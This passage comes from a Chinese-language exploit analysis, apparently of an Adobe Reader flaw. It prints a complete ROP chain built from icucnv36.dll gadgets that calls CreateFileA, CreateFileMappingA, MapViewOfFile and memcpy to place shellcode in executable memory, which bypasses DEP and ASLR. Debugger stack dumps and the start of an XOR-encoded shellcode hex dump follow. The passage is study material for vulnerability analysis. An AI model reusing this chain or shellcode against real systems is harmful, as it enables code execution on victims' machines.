class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用icucnv36.dll中的代码片段,构建ret2lib的ROP Chain.以此绕过DEP,执行shellcode.</span></span><br><span class="line">stack_data = [</span><br><span class="line">    <span class="number">0x41414141</span>,   <span class="comment"># unused,用于补齐堆块内容长度占用的4byte</span></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a8a0000</span>,   <span class="comment"># becomes ecx ; ecx=0x4a8a0000,用于保存eax的地址</span></span><br><span class="line">  </span><br><span class="line">    <span class="number">0x4a802196</span>,   <span class="comment"># mov [ecx],eax / ret # save whatever eax starts as ; [ecx]=[0x4a8a0000]=eax,保存eax</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">    <span class="number">0x4a84903c</span>,   <span class="comment"># becomes eax (import for CreateFileA) ; CreateFileA()在输入表中表项的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -- call CreateFileA</span></span><br><span class="line">    <span class="comment"># 创建或打开一个文件或I/O设备。</span></span><br><span class="line">    <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax] ; 调用CreateFileA()</span></span><br><span class="line">    <span class="comment"># 这里用一条ret指令的地址,使程序执行流转到下一个ROPgadget(0x4a8063a5)执行,栈平衡是由CreateFileA()完成的。</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># ret ; CreateFileA()的返回地址,</span></span><br><span class="line">    <span class="number">0x4a8522c8</span>,   <span class="comment"># first arg   - lpFileName , pointer to "iso88591"</span></span><br><span class="line">    <span class="number">0x10000000</span>,   <span class="comment"># second arg  - dwDesiredAccess</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># third arg   - dwShareMode</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># fourth arg  - lpSecurityAttributes</span></span><br><span class="line">    <span class="number">0x00000002</span>,   <span class="comment"># fifth arg   - dwCreationDisposition</span></span><br><span class="line">    <span class="number">0x00000102</span>,   <span class="comment"># sixth arg   - dwFlagsAndAttributes</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># seventh arg - hTemplateFile</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx ; ecx=0x4a801064,ret指令地址</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret ; edi=0x0012E718,eax=0x00000304,eax&lt;-&gt;edi,edi保存返回值,文件句柄</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">    <span class="number">0x00000008</span>,   <span class="comment"># becomes ebx - offset to modify ; ebx=0x8,要修改位置的偏移</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># This points at a neat-o block of code that ... TBD</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#   and [esp+ebx*2],edi ; 应该只是用这句指令修改下一步要调用的函数的参数 </span></span><br><span class="line">    <span class="comment">#   jne check_slash</span></span><br><span class="line">    <span class="comment"># ret_one:</span></span><br><span class="line">    <span class="comment">#   mov al,1</span></span><br><span class="line">    <span class="comment">#   ret</span></span><br><span class="line">    <span class="comment"># check_slash:</span></span><br><span class="line">    <span class="comment">#   cmp al,0x2f</span></span><br><span class="line">    <span class="comment">#   je ret_one</span></span><br><span class="line">    <span class="comment">#   cmp al,0x41</span></span><br><span class="line">    <span class="comment">#   jl check_lower</span></span><br><span class="line">    <span class="comment">#   cmp al,0x5a</span></span><br><span class="line">    <span class="comment">#   jle check_ptr</span></span><br><span class="line">    <span class="comment"># check_lower:</span></span><br><span class="line">    <span class="comment">#   cmp al,0x61</span></span><br><span class="line">    <span class="comment">#   jl ret_zero</span></span><br><span class="line">    <span class="comment">#   cmp al,0x7a</span></span><br><span class="line">    <span class="comment">#   jg ret_zero</span></span><br><span class="line">    <span class="comment">#   cmp [ecx+1],0x3a</span></span><br><span class="line">    <span class="comment">#   je ret_one</span></span><br><span class="line">    <span class="comment"># ret_zero:</span></span><br><span class="line">    <span class="comment">#   xor al,al</span></span><br><span class="line">    <span class="comment">#   ret</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># 0x4A80A8A6 ; and dword ptr ss:[esp+ebx*2],edi(修改CreateFileMappingA第一个参数为调用CreateFileA返回的文件句柄)</span></span><br><span class="line">    <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">    <span class="number">0x4a849038</span>,   <span class="comment"># becomes eax (import for CreateFileMappingA) ; CreateFileMappingA()在输入表中表项的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -- call CreateFileMappingA</span></span><br><span class="line">    <span class="comment"># 创建或打开指定文件的命名或未命名文件映射对象。</span></span><br><span class="line">    <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax] ; 调用CreateFileMappingA()</span></span><br><span class="line">    <span class="comment"># 这里用一条ret指令的地址,使程序执行流转到下一个ROPgadget(0x4a8063a5)执行,栈平衡是由CreateFileMappingA()完成的。</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># ret ; CreateFileMappingA()的返回地址</span></span><br><span class="line">    <span class="number">0xffffffff</span>,   <span class="comment"># first arg   - hFile ; CreateFileA返回的文件句柄</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># second arg  - lpAttributes</span></span><br><span class="line">    <span class="number">0x00000040</span>,   <span class="comment"># third arg   - flProtect</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># fourth arg  - dwMaximumSizeHigh</span></span><br><span class="line">    <span class="number">0x00010000</span>,   <span class="comment"># fifth arg   - dwMaximumSizeLow</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># sixth arg   - lpName</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx ; ecx=0x4a801064,ret指令地址</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret ; edi=0x00000304,eax=0x00000320,edi&lt;-&gt;eax,edi保存返回值(0x320,文件映射对象的句柄。)</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">    <span class="number">0x00000008</span>,   <span class="comment"># becomes ebx - offset to modify ; ebx=0x8,要修改位置的偏移</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x4A80A8A6 ; and dword ptr ss:[esp+ebx*2],edi(修改MapViewOfFile第一个参数为调用CreateFileMappingA返回的文件映射对象的句柄)</span></span><br><span class="line">    <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">    <span class="number">0x4a849030</span>,   <span class="comment"># becomes eax (import for MapViewOfFile) ; MapViewOfFile()在输入表中表项的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -- call MapViewOfFile</span></span><br><span class="line">    <span class="comment"># 将一个文件映射对象映射到当前应用程序的地址空间。</span></span><br><span class="line">    <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax] ; 调用MapViewOfFile()</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># ret ; MapViewOfFile()的返回地址</span></span><br><span class="line">    <span class="number">0xffffffff</span>,   <span class="comment"># first arg   - hFileMappingObject ; CreateFileMappingA返回的文件映射对象的句柄</span></span><br><span class="line">    <span class="number">0x00000022</span>,   <span class="comment"># second arg  - dwDesiredAccess</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># third arg   - dwFileOffsetHigh</span></span><br><span class="line">    <span class="number">0x00000000</span>,   <span class="comment"># fourth arg  - dwFileOffsetLow</span></span><br><span class="line">    <span class="number">0x00010000</span>,   <span class="comment"># fifth arg   - dwNumberOfBytesToMap</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a8a0004</span>,   <span class="comment"># becomes ecx - writable pointer ; ecx=0x4a8a0004,可写指针,用于保存文件映射基地址的指针</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a802196</span>,   <span class="comment"># mov [ecx],eax / ret - save map base addr ; [ecx]=[0x4a8a0004]=eax=0x03550000,保存文件映射基地址</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret ; ecx=0x4a801064,ret指令地址</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret ; eax=0x03550000,edi=0x320,eax&lt;-&gt;edi,edi保存返回值(0x03550000,文件映射基地址)</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">    <span class="number">0x00000030</span>,   <span class="comment"># becomes ebx - offset to modify ; ebx=0x30,要修改位置的偏移</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x4A80A8A6 ; and dword ptr ss:[esp+ebx*2],edi(修改memcpy返回地址为调用MapViewOfFile返回的文件映射基地址)</span></span><br><span class="line">    <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">    <span class="number">0x4a8a0004</span>,   <span class="comment"># becomes eax - saved file mapping ptr ; eax=0x4a8a0004,保存文件映射基地址的指针</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a80a7d8</span>,   <span class="comment"># mov eax,[eax] / ret - load saved mapping ptr ; eax=[eax]=0x03550000,取文件映射基地址</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret ; ecx=0x4a801064,ret指令地址</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret ; eax=0x03550000,edi=0x03550000,eax&lt;-&gt;edi(0x03550000,文件映射基地址)</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">    <span class="number">0x00000020</span>,   <span class="comment"># becomes ebx - offset to modify ; ebx=0x20,要修改位置的偏移</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x4A80A8A6 ; and dword ptr ss:[esp+ebx*2],edi(修改memcpy第一个参数为调用MapViewOfFile返回的文件映射基地址)</span></span><br><span class="line">    <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret ; ecx=0x4a801064,ret指令地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># lea edx,dword ptr ss:[esp+0xC]    ; edx为0x4a8063a5的地址,edx=0x0C0C0D20,esp=0x0C0C0D14(0x4a801f90),主要语句</span></span><br><span class="line">    <span class="comment"># push edx                          ; edx=0x0C0C0D20                       </span></span><br><span class="line">    <span class="comment"># push eax                          ; eax=0x03550000</span></span><br><span class="line">    <span class="comment"># push dword ptr ss:[esp+0xC]       ; [esp+0xC]=[0x0C0C0D0C+0xC]=[0x0C0C0D18]=0x34                        </span></span><br><span class="line">    <span class="comment"># push dword ptr ds:[0x4A8A093C]    ; [0x4A8A093C]=0x0</span></span><br><span class="line">    <span class="comment"># call ecx                          ; ecx=0x4a801064,ret指令地址                      </span></span><br><span class="line">    <span class="comment"># add esp,0x10                      ; esp=esp+0x10=0x0C0C0D04+0x10=0x0C0C0D14(0x4a801f90)</span></span><br><span class="line">    <span class="comment"># retn                              ; </span></span><br><span class="line">    <span class="number">0x4a80aedc</span>,   <span class="comment"># lea edx,[esp+0xc] / push edx / push eax / push [esp+0xc] / push [0x4a8a093c] / call ecx / add esp, 0x10 / ret</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">    <span class="number">0x00000034</span>,   <span class="comment"># becomes eax ; eax=0x00000034,真正shellcode的地址相对ROPgadget(0x4a8063a5)的偏移</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a80d585</span>,   <span class="comment"># add eax,edx / ret ; eax=eax+edx=0x34+0x0C0C0D20(0x4a8063a5)=0x0C0C0D54(真正shellcode的地址)</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">    <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret ; ecx=0x4a801064,ret指令地址 </span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret ; eax=0x0C0C0D54,edi=0x03550000,eax&lt;-&gt;edi,edi保存真正shellcode的地址(eax=0x03550000,edi=0x0C0C0D54)</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">    <span class="number">0x0000000a</span>,   <span class="comment"># becomes ebx - offset to modify ; ebx=0xa,要修改位置的偏移</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x4A80A8A6 ; and dword ptr ss:[esp+ebx*2],edi(修改memcpy第二个参数为计算出的真正shellcode的地址)</span></span><br><span class="line">    <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">    <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">    <span class="number">0x4a849170</span>,   <span class="comment"># becomes eax (import for memcpy) ; memcpy()在输入表中表项的地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># -- call memcpy</span></span><br><span class="line">    <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line">    <span class="comment"># memcpy的返回地址,由函数块0x4a80a8a6修改,被修改为真正shellcode的地址</span></span><br><span class="line">    <span class="number">0xffffffff</span>,   <span class="comment"># this stuff gets overwritten by the block at 0x4a80aedc, becomes ret from memcpy</span></span><br><span class="line">    <span class="number">0xffffffff</span>,   <span class="comment"># becomes first arg to memcpy (dst)       ; 0x03550000,文件映射基地址</span></span><br><span class="line">    <span class="number">0xffffffff</span>,   <span class="comment"># becomes second arg to memcpy (src)      ; 0x0C0C0D54,真正shellcode的地址</span></span><br><span class="line">    <span class="number">0x00001000</span>,   <span class="comment"># becomes third arg to memcpy (length)    ; 复制长度</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这后面就是经过编码的shellcode的内容</span></span><br><span class="line">].pack(<span class="string">'V*'</span>)</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>我们可以看到调用了四个函数，<code>CreateFileA()</code>、<code>CreateFileMappingA()</code>、<code>MapViewOfFile()</code>、<code>memcpy()</code>。调用<code>createFileA()</code>函数时参数如下：</p>
</blockquote>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 功能:创建一个文件或设备</span></span><br><span class="line">0C0C0C24   4A801064  +-<span class="keyword">CALL</span> 到 CreateFileA</span><br><span class="line">0C0C0C28   4A8522C8  | FileName = <span class="string">"iso88591"</span>    <span class="comment">; 创建一个名为iso88591的文件。</span></span><br><span class="line">0C0C0C2C   <span class="number">10000000</span>  | Access = GENERIC_ALL     <span class="comment">; 此文件访问权限为可读可写可执行。</span></span><br><span class="line">0C0C0C30   <span class="number">00000000</span>  | ShareMode = <span class="number">0</span>            <span class="comment">; 共享模式，0:阻止其他进程在请求删除，读取或写入访问权限时打开文件或设备。</span></span><br><span class="line">0C0C0C34   <span class="number">00000000</span>  | pSecurity = NULL         <span class="comment">; 此参数为NULL，则CreateFile返回的句柄，不能由应用程序可能创建的任何子进程继承，并且与返回的句柄关联的文件或设备将获取默认安全描述符。</span></span><br><span class="line">0C0C0C38   <span class="number">00000002</span>  | Mode = CREATE_ALWAYS     <span class="comment">; 始终创建一个新文件。</span></span><br><span class="line">0C0C0C3C   <span class="number">00000102</span>  | Attributes = HIDDEN|TEMPORARY    <span class="comment">; 文件属性：隐藏文件|临时文件</span></span><br><span class="line">0C0C0C40   <span class="number">00000000</span>  +-hTemplateFile = NULL     <span class="comment">; hTemplateFile为一个文件或设备句柄，表示按这个参数给出的句柄为模板创建文件。通常这个参数设置为NULL，为空表示不使用模板，一般为空。</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>调用<code>CreateFileMappingA()</code>时的参数如下：</p>
</blockquote>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 功能：创建文件映射内核对象，文件与物理页映射</span></span><br><span class="line">0C0C0C68   4A801064  +-<span class="keyword">CALL</span> 到 CreateFileMappingA           </span><br><span class="line">0C0C0C6C   0000036C  | hFile = 0000036C                     <span class="comment">; 文件的句柄，用于创建文件映射对象的文件。CreateFileA的返回值。</span></span><br><span class="line">0C0C0C70   <span class="number">00000000</span>  | pSecurity = NULL                     <span class="comment">; 指向SECURITY_ATTRIBUTES 结构的指针，该结构确定子进程是否可以继承返回的句柄。指定一个安全对象，在创建文件映射时使用。如果为NULL（用ByVal As Long传递零），表示使用默认安全对象。</span></span><br><span class="line">0C0C0C74   <span class="number">00000040</span>  | Protection = PAGE_EXECUTE_READWRITE  <span class="comment">; 指定文件映射对象的页面保护。对象的所有映射视图必须与此保护兼容。必须使用GENERIC_READ、GENERIC_WRITE和GENERIC_EXECUTE访问权限创建hFile参数指定的文件句柄。</span></span><br><span class="line">0C0C0C78   <span class="number">00000000</span>  | MaximumSizeHigh = <span class="number">0x0</span>                <span class="comment">; 文件映射的最大长度的高32位。</span></span><br><span class="line">0C0C0C7C   <span class="number">00010000</span>  | MaximumSizeLow = <span class="number">0x10000</span>             <span class="comment">; 文件映射的最大长度的低32位。</span></span><br><span class="line">0C0C0C80   <span class="number">00000000</span>  +-MapName = NULL                       <span class="comment">; 指定文件映射对象的名字。如果此参数为NULL，则创建没有名称的文件映射对象。</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>调用<code>MapViewOfFile()</code>时的参数如下：</p>
</blockquote>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 功能：将一个文件映射对象映射到当前应用程序的地址空间。将物理页与进程虚拟地址进行映射。</span></span><br><span class="line">0C0C0CA8   4A801064  +-<span class="keyword">CALL</span> 到 MapViewOfFile</span><br><span class="line">0C0C0CAC   <span class="number">00000370</span>  | hMapObject = <span class="number">00000370</span>        <span class="comment">; CreateFileMappingA()返回的文件映射对象句柄。</span></span><br><span class="line">0C0C0CB0   <span class="number">00000022</span>  | AccessMode = <span class="number">0x22</span>            <span class="comment">; 对文件映射对象的访问类型，它决定了页面的保护。</span></span><br><span class="line">0C0C0CB4   <span class="number">00000000</span>  | OffsetHigh = <span class="number">0x0</span>             <span class="comment">; 表示文件映射起始偏移的高32位.</span></span><br><span class="line">0C0C0CB8   <span class="number">00000000</span>  | OffsetLow = <span class="number">0x0</span>              <span class="comment">; 表示文件映射起始偏移的低32位.</span></span><br><span class="line">0C0C0CBC   <span class="number">00010000</span>  +-MapSize = <span class="number">10000</span> (<span class="number">65536</span>.)     <span class="comment">; 指定映射文件的字节数</span></span><br></pre></td></tr></table></figure>
<p>执行完,<code>进程内存</code>中会多一块这样的<code>内存块</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">地址=03EA0000</span><br><span class="line">大小=00010000 (65536.)</span><br><span class="line">属主=03EA0000 (自身)</span><br><span class="line">区段=</span><br><span class="line">类型=Map  00041040</span><br><span class="line">访问=RWE</span><br><span class="line">初始访问=RWE</span><br><span class="line">已映射为=\Device\HarddiskVolume1\Documents and Settings\******\桌面\iso88591</span><br></pre></td></tr></table></figure>
<blockquote>
<p>调用<code>memcopy()</code>时的参数如下：</p>
</blockquote>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 功能：内存拷贝</span></span><br><span class="line">0C0C0D44   03EA0000  +-<span class="keyword">CALL</span> 到 memcpy</span><br><span class="line">0C0C0D48   03EA0000  | dest = 03EA0000      <span class="comment">; 目的dest内存地址，文件映射基地址</span></span><br><span class="line">0C0C0D4C   0C0C0D54  | src = 0C0C0D54       <span class="comment">; 源src内存地址，真正shellcode的地址</span></span><br><span class="line">0C0C0D50   <span class="number">00001000</span>  +-n = <span class="number">1000</span> (<span class="number">4096</span>.)     <span class="comment">; 拷贝字节数</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;最后调用<code>memcopy</code>的时候，<code>目的地址</code>就是前面<code>MapViewOfFile()</code>返回的<code>文件映射基地址</code>，而<code>源地址</code>就是真正的<code>shellcode</code>代码，将它<code>复制</code>到一段<code>可执行可读写的内存段</code>，以此<code>绕过DEP</code>。由于构造的<code>ROP指令</code>均位于不受<code>ASLR</code>保护的<code>icucnv36.dll</code>模块，因此也可以<code>绕过ASLR保护</code>。正是由于<code>DEP</code>的存在，所以<code>堆栈空间</code>是不存在<code>可执行权限</code>的，所以，我们需要创建一个<code>文件映射对象</code>，将其<code>映射</code>到<code>可读可写可执行的内存块</code>，再把shellcode拷贝到那里，就可以执行了。</p>
<h4 id="3、阶段3：执行shellcode"><a href="#3、阶段3：执行shellcode" class="headerlink" title="3、阶段3：执行shellcode"></a>3、阶段3：执行shellcode</h4><p>&emsp;&emsp;<code>Heap Spary</code>中使用的<code>shellcode</code>是经过编码的(<code>payload.encoded</code>)。经过分析,<code>shellcode</code>是通过<code>XOR</code>进行编码的,所以会首先执行<code>XOR解码</code>,然后再执行<code>真正的shellcode</code>功能。<br><strong><code>解码前：</code></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; 内存：</span></span><br><span class="line"><span class="comment">;....0000  BA 6D A5 42 5E DD C4 D9 74 24 F4 5D 31 C9 B1 31  簃^菽賢$鬩1杀1</span></span><br><span class="line"><span class="comment">;....0010  83 C5 04 31 55 0F 03 55 62 47 B7 A2 94 05 38 5B  兣1UUbG发?8[</span></span><br><span class="line"><span class="comment">;....0020  64 6A B0 BE 55 AA A6 CB C5 1A AC 9E E9 D1 E0 0A  dj熬U伺瑸檠?</span></span><br><span class="line"><span class="comment">;....0030  7A 97 2C 3C CB 12 0B 73 CC 0F 6F 12 4E 52 BC F4  z?&lt;?s?oNR剪</span></span><br><span class="line"><span class="comment">;....0040  6F 9D B1 F5 A8 C0 38 A7 61 8E EF 58 06 DA 33 D2  o澅酲?庯X?</span></span><br><span class="line"><span class="comment">;....0050  54 CA 33 07 2C ED 12 96 27 B4 B4 18 E4 CC FC 02  T?,??创涮?</span></span><br><span class="line"><span class="comment">;....0060  E9 E9 B7 B9 D9 86 49 68 10 66 E5 55 9D 95 F7 92  殚饭賳Ihf錟潟鲯</span></span><br><span class="line"><span class="comment">;....0070  19 46 82 EA 5A FB 95 28 21 27 13 AB 81 AC 83 17  F傟Z麜(!'珌瑑</span></span><br><span class="line"><span class="comment">;....0080  30 60 55 D3 3E CD 